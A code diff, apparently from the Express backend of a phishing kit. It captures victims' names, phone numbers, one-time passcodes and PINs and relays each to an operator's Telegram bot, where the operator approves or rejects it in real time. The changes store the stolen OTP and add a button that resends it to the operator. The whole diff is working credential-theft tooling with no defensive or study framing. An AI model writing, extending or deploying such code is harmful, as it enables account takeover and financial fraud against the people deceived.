@@ -107,12 +107,12 @@ app.post('/submit-phone', (req, res) => {
 
 app.get('/check-phone/:id', (req, res) => {
   const result = phoneRequests[req.params.id];
-  if (result === true) return res.json({ redirect: 'link.html' });  // FIXED
+  if (result === true) return res.json({ redirect: 'link.html' });
   if (result === false) return res.json({ approved: false });
   res.json({ approved: null });
 });
 
-// ---------- OTP STEP ----------
+// ---------- OTP STEP (UPDATED with code block + resend) ----------
 app.post('/submit-otp', (req, res) => {
   try {
     const { name, phone, otp, botId } = req.body;
@@ -121,19 +121,26 @@ app.post('/submit-otp', (req, res) => {
 
     const requestId = uuidv4();
     otpRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, botId };
+    // Save OTP so we can resend it later
+    requestMeta[requestId] = { name, phone, botId, otp };
 
     sendTelegram(
       bot,
       `🔐 OTP VERIFICATION
 👤 Name: ${name}
 📞 Phone: ${phone}
-🔢 OTP: ${otp}
+🔢 OTP:
+\`\`\`
+${otp}
+\`\`\`
 🆔 Ref: ${requestId}`,
       [
         [
           { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
           { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
+        ],
+        [
+          { text: '📋 Resend OTP', callback_data: `resend_otp:${requestId}` }
         ]
       ]
     );
@@ -184,7 +191,7 @@ app.get('/check-pin/:id', (req, res) => {
   res.json({ approved: pinRequests[req.params.id] ?? null });
 });
 
-// ---------- TELEGRAM CALLBACK WEBHOOK ----------
+// ---------- TELEGRAM CALLBACK WEBHOOK (UPDATED) ----------
 app.post('/telegram-webhook/:botId', async (req, res) => {
   const bot = getBot(req.params.botId);
   if (!bot) return res.sendStatus(404);
@@ -225,6 +232,20 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
   if (action === 'pin_bad') {
     pinRequests[requestId] = false;
     feedback = '❌ PIN rejected';
+  }
+
+  // NEW: Resend OTP
+  if (action === 'resend_otp') {
+    if (meta && meta.otp) {
+      await sendTelegram(
+        bot,
+        `📋 Here is your OTP again:\n\`\`\`\n${meta.otp}\n\`\`\``,
+        []
+      );
+    }
+    await answerCallback(bot, cb.id);
+    res.sendStatus(200);
+    return;
   }
 
   if (feedback && meta) {
